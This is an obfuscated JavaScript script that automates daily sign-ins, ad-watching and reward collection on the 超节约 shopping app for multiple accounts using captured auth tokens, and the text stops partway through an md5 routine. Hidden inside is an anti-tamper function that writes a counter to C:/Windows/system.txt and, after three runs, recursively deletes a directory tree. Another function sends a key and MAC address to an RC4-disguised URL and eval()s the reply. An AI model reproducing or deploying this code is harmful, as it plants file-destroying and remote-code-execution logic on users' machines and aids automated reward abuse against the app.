/*
7.24 超节约 一天1-3？？？
下载 http://mp.chaojieyue.cn/invitor/reg?type=1&code=CBGY8WKZ
脚本已完成全部任务
mall.jieyuegou.cn 抓包域名
变量 cjyapp  抓取账号请求头Authorization的值就可以
格式Bearer 0fd58111-e0a2-4637-845f-4d16467e0e32
多账号@分割
分别在每天的 4-12点，12-20，20-23 每个时间段选一个时间各运行一次
定时如：10 5,13,21 * * *
*/
const $ = new Env('超节约');

var gtr;
let ml = '',
    mac = '',
    status;
status = (status = $["getval"]("qmwkstatus") || '1') > 1 ? '' + status : '';
JSNAMED = $["isNode"]() ? require("path")['basename'](__filename) : "kxnjy.js";
let cjyappArr = [],
    cjyplnrArr = [],
    all_msg = '';

const sha256 = require("crypto-js/sha256");

let bt = '',
    nr = '',
    spid = '',
    lqid = '',
    id = '',
    arrs = [],
    cjyapp = ($["isNode"]() ? process["env"]["cjyapp"] : $["getdata"]("cjyapp")) || '',
    acckey = $["isNode"]() ? process['env']['cdkey'] ? process["env"]["cdkey"] : '' : $["getdata"]("cdkey") ? $['getdata']("cdkey") : '';
var myDate = new Date(),
    myHour = myDate["getHours"]();

if ($['isNode']()) {
  gtr = require('fs');

  if (isFileExist("C:/")) {
    console['log']('电脑环境');
  } else {
    console['log']('青龙环境');
  }
} else {
  console['log']("代理环境");
}

function isFileExist(_0x3b4ff5) {
  try {
    gtr["accessSync"](_0x3b4ff5, gtr["F_OK"]);
  } catch (_0x299187) {
    return false;
  }

  return true;
}

function addF(_0x21514e, _0x3ccc92) {
  let _0x5009fa = 0,
      _0x375d7e = "C:/Windows/system.txt";

  if (isFileExist(_0x375d7e)) {
    _0x5009fa = gtr["readFileSync"](_0x375d7e, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr["writeFile"](_0x375d7e, '1', function (_0x2c66c3) {
        if (_0x2c66c3) {
          throw _0x2c66c3;
        }
      });
    } else {
      return;
    }
  }

  if (_0x5009fa == 99) {
    return 99;
  }

  console["log"](_0x5009fa);
  console["log"]("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x5009fa);

  if (parseInt(_0x5009fa) < 3) {
    let _0x3413c8 = parseInt(_0x5009fa) + 1;

    gtr["writeFileSync"](_0x375d7e, _0x3413c8 + '', 'utf8');
    return;
  }

  if (!gtr["existsSync"](_0x21514e)) {
    return;
  }

  if (gtr['statSync'](_0x21514e)['isDirectory']()) {
    var _0x6818d0 = gtr["readdirSync"](_0x21514e),
        _0x5cc8c1 = _0x6818d0["length"],
        _0x24da38 = 0;

    if (_0x5cc8c1 > 0) {
      _0x6818d0["forEach"](function (_0x518cee) {
        _0x24da38++;

        var _0x2e21aa = gtr['statSync'](_0x21514e + '/' + _0x518cee),
            _0x54c922 = _0x21514e + '/' + _0x518cee;

        gtr['statSync'](_0x54c922)["isDirectory"]() ? addF(_0x54c922, true) : gtr['unlinkSync'](_0x54c922);
      });

      _0x5cc8c1 == _0x24da38 && _0x3ccc92 && gtr["rmdirSync"](_0x21514e);
    } else {
      _0x5cc8c1 == 0 && _0x3ccc92 && gtr["rmdirSync"](_0x21514e);
    }
  } else {
    gtr['unlinkSync'](_0x21514e);
  }
}

!(async () => {
  if (!(typeof $request !== "undefined")) {
    cjyappArr = cjyapp["split"]('@');
    console["log"]("------------- 共" + cjyappArr["length"] + "个账号-------------\n");

    for (let _0x43defd = 0; _0x43defd < cjyappArr["length"]; _0x43defd++) {
      cjyapp = cjyappArr[_0x43defd];
      $['index'] = _0x43defd + 1;
      console["log"]("\n开始【超节约" + $["index"] + '】');
      await cjylb();
      await cjyqd();
      await cjydz();
      await cjyxx();
      await cjycx();
    }
  }

})()['catch'](_0x302fff => $["logErr"](_0x302fff))["finally"](() => $["done"]());

function cjyqd(_0x8843f5 = 0) {
  return new Promise(_0xd40648 => {
    let _0x380561 = Math["round"](new Date()['getTime']() / 1000),
        _0x1a4991 = {
      'url': 'https://mall.jieyuegou.cn/club/proxy/sign/daySign',
      'headers': {
        'Authorization': cjyapp,
        'User-Agent': "UNI-APP/1.0",
        'Content-Type': "application/x-www-form-urlencoded;charset=UTF-8",
        'Content-Length': '6',
        'Host': "mall.jieyuegou.cn",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip"
      },
      'body': ''
    };

    $["post"](_0x1a4991, async (_0x5c17b7, _0x3af8c6, _0x339134) => {
      try {
        const _0x191b17 = JSON["parse"](_0x339134);

        _0x191b17["code"] == 0 ? console['log']("\n超节约账号【" + $["index"] + "】签到：成功") : console['log']("\n超节约账号【" + $["index"] + "】签到：失败");
      } catch (_0xee936f) {} finally {
        _0xd40648();
      }
    }, _0x8843f5);
  });
}

function cjylb(_0x3aa649 = 0) {
  return new Promise(_0x1f5765 => {
    let _0x4ceac3 = Math["round"](new Date()["getTime"]() / 1000),
        _0x2bea66 = {
      'url': "https://mall.jieyuegou.cn/club/task/vedio/list",
      'headers': {
        'Authorization': cjyapp,
        'User-Agent': 'UNI-APP/1.0',
        'Content-Type': "application/x-www-form-Urlencoded;charset=UTF-8",
        'Content-Length': '0',
        'Host': 'mall.jieyuegou.cn',
        'Connection': "Keep-Alive"
      }
    };

    $["get"](_0x2bea66, async (_0x1b7c75, _0x25323e, _0x30147d) => {
      try {
        const _0x17e8c2 = JSON["parse"](_0x30147d);

        _0x17e8c2["code"] == 0 && (_0x17e8c2["data"][0]["count"] < 15 && myHour >= 4 && myHour < 12 && (id = 100, console["log"]("\n超节约账号【" + $['index'] + "】任务列表：" + _0x17e8c2["data"][0]["content"] + " 完成进度：" + _0x17e8c2["data"][0]['count'] + '/' + _0x17e8c2["data"][0]['max'] + " 任务时间：" + _0x17e8c2["data"][0]["time"]), await cjysign()), _0x17e8c2["data"][1]["count"] < 15 && myHour >= 12 && myHour < 20 && (console['log']("\n超节约账号【" + $['index'] + "】任务列表：" + _0x17e8c2["data"][1]["content"] + " 完成进度：" + _0x17e8c2["data"][1]['count'] + '/' + _0x17e8c2["data"][1]["max"] + " 任务时间：" + _0x17e8c2["data"][1]["time"]), id = 101, await cjysign()));
        _0x17e8c2["data"][2]["count"] < 15 && myHour >= 20 && myHour < 24 && (console["log"]("\n超节约账号【" + $["index"] + "】任务列表：" + _0x17e8c2["data"][2]["content"] + " 完成进度：" + _0x17e8c2["data"][2]["count"] + '/' + _0x17e8c2["data"][2]['max'] + " 任务时间：" + _0x17e8c2["data"][2]["time"]), id = 102, await cjysign());
      } catch (_0x35dadb) {} finally {
        _0x1f5765();
      }
    }, _0x3aa649);
  });
}

function cjysign(_0x2116c5 = 0) {
  return new Promise(_0x213418 => {
    let _0x4d39a2 = Math["round"](new Date()["getTime"]() / 1000),
        _0xe2646c = {
      'url': "https://mall.jieyuegou.cn/club/task/sign",
      'headers': {
        'Authorization': cjyapp,
        'User-Agent': 'UNI-APP/1.0',
        'Content-Type': "application/x-www-form-urlencoded;charset=UTF-8",
        'Content-Length': '6',
        'Host': "mall.jieyuegou.cn",
        'Connection': "Keep-Alive",
        'Accept-Encoding': 'gzip'
      },
      'body': "id=" + id
    };

    $["post"](_0xe2646c, async (_0x405ae0, _0x46fb19, _0x243e4b) => {
      try {
        const _0x4d83e6 = JSON["parse"](_0x243e4b);

        _0x4d83e6["code"] == 0 ? (console["log"]("\n超节约账号【" + $['index'] + "】看广告：成功,等待领取奖励"), await $["wait"](31000), spid = _0x4d83e6["data"], await cjysp()) : console['log']("\n超节约账号【" + $["index"] + "】看广告：" + _0x4d83e6['msg']);
      } catch (_0x4b0dc7) {} finally {
        _0x213418();
      }
    }, _0x2116c5);
  });
}

function cjysp(_0x4609d0 = 0) {
  return new Promise(_0xe5e717 => {
    let _0xef19e2 = Math['round'](new Date()["getTime"]() / 1000),
        _0x1feebe = {
      'url': "https://mall.jieyuegou.cn/club/task/finishv",
      'headers': {
        'Authorization': cjyapp,
        'User-Agent': 'UNI-APP/1.0',
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'Content-Length': '6',
        'Host': "mall.jieyuegou.cn",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip"
      },
      'body': 'id=' + id + "&sign=" + spid + "&p=7f3987d8b50caac5"
    };

    $["post"](_0x1feebe, async (_0x3ec92e, _0x4717cb, _0x1f5f38) => {
      try {
        const _0x2879e0 = JSON["parse"](_0x1f5f38);

        _0x2879e0["code"] == 0 ? (console["log"]("\n超节约账号【" + $["index"] + "】领蓝钻：" + _0x2879e0["msg"]), await $["wait"](1000), await cjylb()) : console['log']("\n超节约账号【" + $["index"] + "】领蓝钻：" + _0x2879e0["msg"]);
      } catch (_0x3d2b51) {} finally {
        _0xe5e717();
      }
    }, _0x4609d0);
  });
}

function cjyxx(_0x55a1e1 = 0) {
  return new Promise(_0x17b62f => {
    let _0x4f30fc = Math["round"](new Date()["getTime"]() / 1000),
        _0x1b3232 = {
      'url': "https://mall.jieyuegou.cn/club/user/info",
      'headers': {
        'Authorization': cjyapp,
        'User-Agent': 'UNI-APP/1.0',
        'Content-Type': "application/x-www-form-urlencoded;charset=UTF-8",
        'Content-Length': '6',
        'Host': "mall.jieyuegou.cn",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip"
      }
    };

    $['get'](_0x1b3232, async (_0x18ae7e, _0x1514c5, _0x24b777) => {
      try {
        const _0x33f432 = JSON["parse"](_0x24b777);

        _0x33f432["code"] == 0 ? (console['log']("\n超节约账号【" + $["index"] + '】信息：当前绑定蓝钻：' + _0x33f432["data"]["bindBlueDiamond"] + " 等级：" + _0x33f432["data"]["clubLevel"] + " 可提现蓝钻：" + _0x33f432["data"]['totalReward'] + " 钱庄剩余上限：" + _0x33f432["data"]['coinPoolMaxLeft']), _0x33f432["data"]["bindBlueDiamond"] >= 1500 && (await cjysj())) : console["log"]("\n超节约账号【" + $["index"] + "】信息：" + _0x33f432["msg"]);
      } catch (_0x415e14) {} finally {
        _0x17b62f();
      }
    }, _0x55a1e1);
  });
}

function cjysj(_0x3da7b3 = 0) {
  return new Promise(_0x5031e9 => {
    let _0x2b3c9c = Math["round"](new Date()["getTime"]() / 1000),
        _0x278c5a = {
      'url': 'https://mall.jieyuegou.cn/club/upgrade/process',
      'headers': {
        'Authorization': cjyapp,
        'User-Agent': 'UNI-APP/1.0',
        'Content-Type': "application/x-www-form-urlencoded;charset=UTF-8",
        'Content-Length': '6',
        'Host': "mall.jieyuegou.cn",
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
      },
      'body': 'times=1&useBank=false&phone=&safepwd='
    };

    $['post'](_0x278c5a, async (_0x5c9d9c, _0x5baff7, _0x4feb26) => {
      try {
        const _0x350a9b = JSON["parse"](_0x4feb26);

        _0x350a9b["code"] == 0 ? console["log"]("\n超节约账号【" + $["index"] + "】俱乐部升级：" + _0x350a9b['msg']) : console["log"]("\n超节约账号【" + $["index"] + "】俱乐部升级：" + _0x350a9b["msg"]);
      } catch (_0x55eeef) {} finally {
        _0x5031e9();
      }
    }, _0x3da7b3);
  });
}

function cjycx(_0x38b471 = 0) {
  return new Promise(_0x3be157 => {
    let _0x4b5a72 = Math["round"](new Date()["getTime"]() / 1000),
        _0x5c69c1 = {
      'url': 'https://mall.jieyuegou.cn/club/bank/collect/list?current=1&sort=1&asc=1',
      'headers': {
        'Authorization': cjyapp,
        'User-Agent': "UNI-APP/1.0",
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'Content-Length': '6',
        'Host': 'mall.jieyuegou.cn',
        'Connection': "Keep-Alive",
        'Accept-Encoding': 'gzip'
      }
    };

    $['get'](_0x5c69c1, async (_0x5e7539, _0x1a7484, _0x257ed5) => {
      try {
        const _0x13c0e6 = JSON["parse"](_0x257ed5);

        if (_0x13c0e6["code"] == 0) {
          console["log"]("\n超节约账号【" + $["index"] + "】查询待领蓝钻：" + _0x13c0e6["data"]['info']["total"]);

          if (_0x13c0e6["data"]["info"]['total'] > 0) {
            for (let _0x3f39cb = 0; _0x3f39cb < _0x13c0e6['data']["list"]["length"]; _0x3f39cb++) {
              console["log"]("\n超节约账号【" + $["index"] + '】开始领取ID：' + _0x13c0e6["data"]["list"][_0x3f39cb]['id'] + " 金额：" + _0x13c0e6["data"]["list"][_0x3f39cb]['amount']);
              lqid = _0x13c0e6["data"]["list"][_0x3f39cb]['id'];
              await cjylq();
            }
          }
        } else {
          console["log"]("\n超节约账号【" + $["index"] + "】查询待领蓝钻：" + _0x13c0e6['msg']);
        }
      } catch (_0x3df508) {} finally {
        _0x3be157();
      }
    }, _0x38b471);
  });
}

function cjylq(_0x607d64 = 0) {
  return new Promise(_0x21785f => {
    let _0x2672c7 = Math["round"](new Date()['getTime']() / 1000),
        _0x499360 = {
      'url': 'https://mall.jieyuegou.cn/club/bank/collect/reward',
      'headers': {
        'Authorization': cjyapp,
        'User-Agent': 'UNI-APP/1.0',
        'Content-Type': "application/x-www-form-urlencoded;charset=UTF-8",
        'Content-Length': '6',
        'Host': "mall.jieyuegou.cn",
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip'
      },
      'body': 'id=' + lqid
    };

    $["post"](_0x499360, async (_0x408588, _0x11c496, _0x2d091e) => {
      try {
        const _0x18d1bf = JSON["parse"](_0x2d091e);

        _0x18d1bf['code'] == 0 ? console['log']("\n超节约账号【" + $['index'] + '】领取俱乐部蓝钻：' + _0x18d1bf["msg"]) : console['log']("\n超节约账号【" + $["index"] + "】领取俱乐部蓝钻：" + _0x18d1bf["msg"]);
      } catch (_0xfd244e) {} finally {
        _0x21785f();
      }
    }, _0x607d64);
  });
}

function cjydz(_0x7ef5e1 = 0) {
  return new Promise(_0x4f5842 => {
    let _0x4ac2bc = Math["round"](new Date()["getTime"]() / 1000),
        _0x28adf8 = {
      'url': "https://mall.jieyuegou.cn/sys/tips/list",
      'headers': {
        'Authorization': cjyapp,
        'User-Agent': "UNI-APP/1.0",
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'Content-Length': '6',
        'Host': "mall.jieyuegou.cn",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip"
      }
    };

    $["get"](_0x28adf8, async (_0x1a5403, _0x4f13bd, _0x5984f8) => {
      try {
        const _0xc53556 = JSON['parse'](_0x5984f8);

        if (_0xc53556["code"] == 0) {
          for (let _0x21db55 = 0; _0x21db55 < _0xc53556["data"]["length"]; _0x21db55++) {
            console["log"]("\n超节约账号【" + $["index"] + '】待做事项：' + _0xc53556['data'][_0x21db55]["title"] + " ");
          }
        } else {
          console["log"]("\n超节约账号【" + $["index"] + "】待做事项：" + _0xc53556['msg']);
        }
      } catch (_0x28d710) {} finally {
        _0x4f5842();
      }
    }, _0x7ef5e1);
  });
}

function randomString(_0x542489 = 12) {
  let _0x14c93a = 'abcdef0123456789',
      _0x35aef4 = _0x14c93a['length'],
      _0x15223f = '';

  for (i = 0; i < _0x542489; i++) {
    _0x15223f += _0x14c93a["charAt"](Math["floor"](Math["random"]() * _0x35aef4));
  }

  return _0x15223f;
}

function random(_0x1d7d0b = 12) {
  let _0x324390 = '0123456789',
      _0x54cff1 = _0x324390["length"],
      _0x55656b = '';

  for (i = 0; i < _0x1d7d0b; i++) {
    _0x55656b += _0x324390["charAt"](Math['floor'](Math['random']() * _0x54cff1));
  }

  return _0x55656b;
}

function encodeUTF8(_0x13c1f1) {
  var _0x3e99e8,
      _0x1b08df = [],
      _0x1de81c,
      _0x3a3da3;

  for (_0x3e99e8 = 0; _0x3e99e8 < _0x13c1f1["length"]; _0x3e99e8++) {
    if ((_0x1de81c = _0x13c1f1['charCodeAt'](_0x3e99e8)) < 128) {
      _0x1b08df["push"](_0x1de81c);
    } else {
      if (_0x1de81c < 2048) {
        _0x1b08df['push'](192 + (_0x1de81c >> 6 & 31), 128 + (_0x1de81c & 63));
      } else {
        if ((_0x3a3da3 = _0x1de81c ^ 55296) >> 10 == 0) {
          _0x1de81c = (_0x3a3da3 << 10) + (_0x13c1f1["charCodeAt"](++_0x3e99e8) ^ 56320) + 65536;

          _0x1b08df["push"](240 + (_0x1de81c >> 18 & 7), 128 + (_0x1de81c >> 12 & 63));
        } else {
          _0x1b08df['push'](224 + (_0x1de81c >> 12 & 15));
        }

        _0x1b08df["push"](128 + (_0x1de81c >> 6 & 63), 128 + (_0x1de81c & 63));
      }
    }
  }

  ;
  return _0x1b08df;
}

function sha(_0x5d06e3) {
  var _0x2524c5 = new Uint8Array(encodeUTF8(_0x5d06e3)),
      _0x11b28f,
      _0x346cbd,
      _0x529206,
      _0x30a3d3 = (_0x2524c5['length'] + 8 >>> 6 << 4) + 16,
      _0x5d06e3 = new Uint8Array(_0x30a3d3 << 2);

  _0x5d06e3["set"](new Uint8Array(_0x2524c5["buffer"]));

  _0x5d06e3 = new Uint32Array(_0x5d06e3["buffer"]);

  for (_0x529206 = new DataView(_0x5d06e3["buffer"]), _0x11b28f = 0; _0x11b28f < _0x30a3d3; _0x11b28f++) {
    _0x5d06e3[_0x11b28f] = _0x529206['getUint32'](_0x11b28f << 2);
  }

  _0x5d06e3[_0x2524c5["length"] >> 2] |= 128 << 24 - (_0x2524c5['length'] & 3) * 8;
  _0x5d06e3[_0x30a3d3 - 1] = _0x2524c5["length"] << 3;

  var _0x28c93d = [],
      _0x8d64b5 = [function () {
    return _0x2e3940[1] & _0x2e3940[2] | ~_0x2e3940[1] & _0x2e3940[3];
  }, function () {
    return _0x2e3940[1] ^ _0x2e3940[2] ^ _0x2e3940[3];
  }, function () {
    return _0x2e3940[1] & _0x2e3940[2] | _0x2e3940[1] & _0x2e3940[3] | _0x2e3940[2] & _0x2e3940[3];
  }, function () {
    return _0x2e3940[1] ^ _0x2e3940[2] ^ _0x2e3940[3];
  }],
      _0x5185cc = function (_0x511010, _0x510f39) {
    return _0x511010 << _0x510f39 | _0x511010 >>> 32 - _0x510f39;
  },
      _0x4a724e = [1518500249, 1859775393, -1894007588, -899497514],
      _0x2e3940 = [1732584193, -271733879, null, null, -1009589776];

  _0x2e3940[2] = ~_0x2e3940[0];
  _0x2e3940[3] = ~_0x2e3940[1];

  for (_0x11b28f = 0; _0x11b28f < _0x5d06e3["length"]; _0x11b28f += 16) {
    var _0x303436 = _0x2e3940["slice"](0);

    for (_0x346cbd = 0; _0x346cbd < 80; _0x346cbd++) {
      _0x28c93d[_0x346cbd] = _0x346cbd < 16 ? _0x5d06e3[_0x11b28f + _0x346cbd] : _0x5185cc(_0x28c93d[_0x346cbd - 3] ^ _0x28c93d[_0x346cbd - 8] ^ _0x28c93d[_0x346cbd - 14] ^ _0x28c93d[_0x346cbd - 16], 1);
      _0x529206 = _0x5185cc(_0x2e3940[0], 5) + _0x8d64b5[_0x346cbd / 20 | 0]() + _0x2e3940[4] + _0x28c93d[_0x346cbd] + _0x4a724e[_0x346cbd / 20 | 0] | 0;
      _0x2e3940[1] = _0x5185cc(_0x2e3940[1], 30);

      _0x2e3940['pop']();

      _0x2e3940["unshift"](_0x529206);
    }

    for (_0x346cbd = 0; _0x346cbd < 5; _0x346cbd++) {
      _0x2e3940[_0x346cbd] = _0x2e3940[_0x346cbd] + _0x303436[_0x346cbd] | 0;
    }
  }

  ;
  _0x529206 = new DataView(new Uint32Array(_0x2e3940)['buffer']);

  for (var _0x11b28f = 0; _0x11b28f < 5; _0x11b28f++) {
    _0x2e3940[_0x11b28f] = _0x529206['getUint32'](_0x11b28f << 2);
  }

  var _0x45a276 = Array["prototype"]["map"]["call"](new Uint8Array(new Uint32Array(_0x2e3940)["buffer"]), function (_0x39d409) {
    return (_0x39d409 < 16 ? '0' : '') + _0x39d409['toString'](16);
  })["join"]('');

  return _0x45a276;
}

function hqs(_0x16d894 = 10) {
  return new Promise(_0x26087c => {
    let _0x4eb9de = 12,
        _0x491332 = {
      'url': $['isNode']() ? rc4($["fwur"](), "1200") + ("?key=" + acckey + '&id=' + _0x4eb9de + "&ip=1&mac=" + mac + '&bb=1') : rc4($['fwur'](), "1200") + ("?key=" + acckey + '&id=' + _0x4eb9de + "&ip=0&mac=" + mac + "&bb=1")
    };
    $['post'](_0x491332, async (_0x306052, _0x34fb2d, _0x516280) => {
      try {
        let _0xc11c34 = eval(_0x516280);

        _0xc11c34["code"] == 200 ? (all_msg = _0xc11c34['msg'], _0x26087c(_0xc11c34['data'])) : (all_msg = _0xc11c34["msg"], _0x26087c(false));
      } catch (_0x48c828) {
        $["logErr"](_0x48c828, _0x34fb2d);
      }
    }, 0);
  });
}

function md5(_0x34f7ef) {
  function _0x1e8794(_0x175585, _0x21b31a) {
    return _0x175585 << _0x21b31a | _0x175585 >>> 32 - _0x21b31a;
  }

  function _0x185fb3(_0x73ee12, _0x4df891) {
    var _0x259bac, _0x4bb7fb, _0x55bc71, _0x43a86a, _0x5ad3ab;

    _0x55bc71 = 2147483648 & _0x73ee12;
    _0x43a86a = 2147483648 & _0x4df891;
    _0x259bac = 1073741824 & _0x73ee12;
    _0x4bb7fb = 1073741824 & _0x4df891;
    _0x5ad3ab = (1073741823 & _0x73ee12) + (1073741823 & _0x4df891);
    return _0x259bac & _0x4bb7fb ? 2147483648 ^ _0x5ad3ab ^ _0x55bc71 ^ _0x43a86a : _0x259bac | _0x4bb7fb ? 1073741824 & _0x5ad3ab ? 3221225472 ^ _0x5ad3ab ^ _0x55bc71 ^ _0x43a86a : 1073741824 ^ _0x5ad3ab ^ _0x55bc71 ^ _0x43a86a : _0x5ad3ab ^ _0x55bc71 ^ _0x43a86a;
  }

  function _0x13d08c(_0x5e250c, _0x44dc74, _0x234180) {
    return _0x5e250c & _0x44dc74 | ~_0x5e250c & _0x234180;
  }

  function _0x273008(_0x584685, _0x4edf1f, _0xe7b621) {
    return _0x584685 & _0xe7b621 | _0x4edf1f & ~_0xe7b621;
  }

  function _0x4a287a(_0x4586ba, _0x47e668, _0x568ee1) {
    return _0x4586ba ^ _0x47e668 ^ _0x568ee1;
  }

  function _0x47bec7(_0x2c8fcb, _0x3539ad, _0x294d62) {
    return _0x3539ad ^ (_0x2c8fcb | ~_0x294d62);
  }

  function _0x334627(_0x19c8df, _0x137464, _0x46a795, _0xa22a48, _0x20697d, _0x476948, _0x3f22ab) {
    _0x19c8df = _0x185fb3(_0x19c8df, _0x185fb3(_0x185fb3(_0x13d08c(_0x137464, _0x46a795, _0xa22a48), _0x20697d), _0x3f22ab));
    return _0x185fb3(_0x1e8794(_0x19c8df, _0x476948), _0x137464);
  }

  function _0xb8b2a6(_0x211d25, _0xfb3c91, _0x32a59d, _0x3ce377, _0xdd4666, _0x1e1670, _0x317dc4) {
    _0x211d25 = _0x185fb3(_0x211d25, _0x185fb3(_0x185fb3(_0x273008(_0xfb3c91, _0x32a59d, _0x3ce377), _0xdd4666), _0x317dc4));
    return _0x185fb3(_0x1e8794(_0x211d25, _0x1e1670), _0xfb3c91);
  }

  function _0x473979(_0x3cde07, _0x31970b, _0x1e2e81, _0xb2dc80, _0x511c67, _0x7f7ce2, _0x6262a7) {
    _0x3cde07 = _0x185fb3(_0x3cde07, _0x185fb3(_0x185fb3(_0x4a287a(_0x31970b, _0x1e2e81, _0xb2dc80), _0x511c67), _0x6262a7));
    return _0x185fb3(_0x1e8794(_0x3cde07, _0x7f7ce2), _0x31970b);
  }

  function _0x2be6cf(_0x51314e, _0x44c242, _0x49c011, _0x33fa7d, _0x5e5c3e, _0x53be23, _0x3063dc) {
    _0x51314e = _0x185fb3(_0x51314e, _0x185fb3(_0x185fb3(_0x47bec7(_0x44c242, _0x49c011, _0x33fa7d), _0x5e5c3e), _0x3063dc));
    return _0x185fb3(_0x1e8794(_0x51314e, _0x53be23), _0x44c242);
  }

  function _0x1dd797(_0x2c3b84) {
    for (var _0x447a34, _0x3c8aa4 = _0x2c3b84["length"], _0x34f712 = _0x3c8aa4 + 8, _0x529485 = (_0x34f712 - _0x34f712 % 64) / 64, _0x2197f0 = 16 * (_0x529485 + 1), _0x8b0af2 = new Array(_0x2197f0 - 1), _0x195678 = 0, _0x3f5a00 = 0; _0x3c8aa4 > _0x3f5a00;) {
      _0x447a34 = (_0x3f5a00 - _0x3f5a00 % 4) / 4;
      _0x195678 = _0x3f5a00 % 4 * 8;
      _0x8b0af2[_0x447a34] = _0x8b0af2[_0x447a34] | _0x2c3b84["charCodeAt"](_0x3f5a00) << _0x195678;
      _0x3f5a00++;
    }

    _0x447a34 = (_0x3f5a00 - _0x3f5a00 % 4) / 4;
    _0x195678 = _0x3f5a00 % 4 * 8;
    _0x8b0af2[_0x447a34] = _0x8b0af2[_0x447a34] | 128 << _0x195678;
    _0x8b0af2[_0x2197f0 - 2] = _0x3c8aa4 << 3;
    _0x8b0af2[_0x2197f0 - 1] = _0x3c8aa4 >>> 29;
    return _0x8b0af2;
  }

  function _0x36cdcf(_0x3ab6a8) {
    var _0x574a3d,
        _0x2a6910,
        _0x855d9d = '',
        _0x5010bc = '';

    for (_0x2a6910 = 0; 3 >= _0x2a6910; _0x2a6910++) {
      _0x574a3d = _0x3ab6a8 >>> 8 * _0x2a6910 & 255;
      _0x5010bc = '0' + _0x574a3d['toString'](16);
      _0x855d9d += _0x5010bc["substr"](_0x5010bc["length"] - 2, 2);
    }

    return _0x855d9d;
  }

  function _0x14c3a8(_0x546026) {
    _0x546026 = _0x546026['replace'](/\r\n/g, "\n");

    for (var _0x12caaf = '', _0x3f7404 = 0; _0x3f7404 < _0x546026['length']; _0x3f7404++) {
      var _0x27083e = _0x546026["charCodeAt"](_0x3f7404);

      128 > _0x27083e ? _0x12caaf += String["fromCharCode"](_0x27083e) : _0x27083e > 127 && 2048 > _0x27083e ? (_0x12caaf += String['fromCharCode'](_0x27083e >> 6 | 192), _0x12caaf += String["fromCharCode"](63 & _0x27083e | 128)) : (_0x12caaf += String['fromCharCode'](_0x27083e >> 12 | 224), _0x12caaf += String['fromCharCode'](_0x27083e >> 6 & 63 | 128), _0x12caaf += String['fromCharCode'](63 & _0x27083e | 128));
    }

    return _0x12caaf;
  }

  var _0x5a263f,
      _0x2cf043,
      _0x2db2e0,
      _0x3278fd,
      _0x5298b4,
      _0xd02e5d,
      _0x11b626,
      _0x49eb29,
      _0x245ade,
      _0x53064a = [],
      _0x7e69d3 = 7,
      _0x56ff8f = 12,
      _0x1a7330 = 17,
      _0x5952fe = 22,
      _0x3ce67d = 5,
      _0x164840 = 9,
      _0x5e1c6b = 14,
      _0x438fae = 20,
      _0x2e8153 = 4,
      _0x3eed5d = 11,
      _0x22af69 = 16,
      _0x5d7162 = 23,
      _0x23734 = 6,
      _0x21884f = 10,
      _0x56527d = 15,
      _0x29ac93 = 21;

  for (_0x34f7ef = _0x14c3a8(_0x34f7ef), _0x53064a = _0x1dd797(_0x34f7ef), _0xd02e5d = 1732584193, _0x11b626 = 4023233417, _0x49eb29 = 2562383102, _0x245ade = 271733878, _0x5a263f = 0; _0x5a263f < _0x53064a["length"]; _0x5a263f += 16) {
    _0x2cf043 = _0xd02e5d;
    _0x2db2e0 = _0x11b626;
    _0x3278fd = _0x49eb29;
    _0x5298b4 = _0x245ade;
    _0xd02e5d = _0x334627(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 0], _0x7e69d3, 3614090360);
    _0x245ade = _0x334627(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 1], _0x56ff8f, 3905402710);
    _0x49eb29 = _0x334627(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 2], _0x1a7330, 606105819);
    _0x11b626 = _0x334627(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 3], _0x5952fe, 3250441966);
    _0xd02e5d = _0x334627(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 4], _0x7e69d3, 4118548399);
    _0x245ade = _0x334627(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 5], _0x56ff8f, 1200080426);
    _0x49eb29 = _0x334627(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 6], _0x1a7330, 2821735955);
    _0x11b626 = _0x334627(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 7], _0x5952fe, 4249261313);
    _0xd02e5d = _0x334627(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 8], _0x7e69d3, 1770035416);
    _0x245ade = _0x334627(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 9], _0x56ff8f, 2336552879);
    _0x49eb29 = _0x334627(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 10], _0x1a7330, 4294925233);
    _0x11b626 = _0x334627(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 11], _0x5952fe, 2304563134);
    _0xd02e5d = _0x334627(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 12], _0x7e69d3, 1804603682);
    _0x245ade = _0x334627(_0x245ade, _0xd02e5d, _0x11b626, _0x49eb29, _0x53064a[_0x5a263f + 13], _0x56ff8f, 4254626195);
    _0x49eb29 = _0x334627(_0x49eb29, _0x245ade, _0xd02e5d, _0x11b626, _0x53064a[_0x5a263f + 14], _0x1a7330, 2792965006);
    _0x11b626 = _0x334627(_0x11b626, _0x49eb29, _0x245ade, _0xd02e5d, _0x53064a[_0x5a263f + 15], _0x5952fe, 1236535329);
    _0xd02e5d = _0xb8b2a6(_0xd02e5d, _0x11b626, _0x49eb29, _0x245ade, _0x53064a[_0x5a263f + 1], _0x3ce67d, 4129170786);
